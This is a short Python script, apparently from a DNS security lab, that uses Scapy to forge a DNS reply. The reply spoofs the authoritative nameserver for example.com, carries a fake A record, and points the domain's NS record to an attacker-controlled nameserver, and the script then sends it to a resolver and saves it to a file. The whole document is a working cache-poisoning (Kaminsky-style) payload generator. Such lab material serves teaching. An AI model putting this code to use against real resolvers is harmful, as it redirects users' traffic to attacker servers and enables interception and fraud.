from scapy.all import IP, DNS, UDP, DNSRR, send, DNSQR

DNS_SERVER = '10.9.0.53'
ATK_NSIP = '10.9.0.153'
USER_IP = '10.9.0.5'
GTLD_IP = '192.58.128.30'
TARGET_ASIP = '93.184.216.34'
TARGET_NSIP = '199.43.135.53'
name = 'abcde.example.com'
domain = 'example.com'
ATK_NSDM = 'ns.attaker32.com'

Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type='A', rdata='1.1.1.1', ttl=259200)
NSsec = DNSRR(rrname=domain, type='NS', rdata=ATK_NSDM, ttl=259200)
dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1,
qdcount=1, ancount=1, nscount=1, arcount=0,
qd=Qdsec, an=Anssec, ns=NSsec)
ip = IP(dst=DNS_SERVER, src=TARGET_NSIP)
udp = UDP(dport=33333, sport=53, chksum=0)
reply = ip/udp/dns
send(reply)
print(reply.summary())
with open('ip_resp.bin', 'wb') as f:
  f.write(bytes(reply))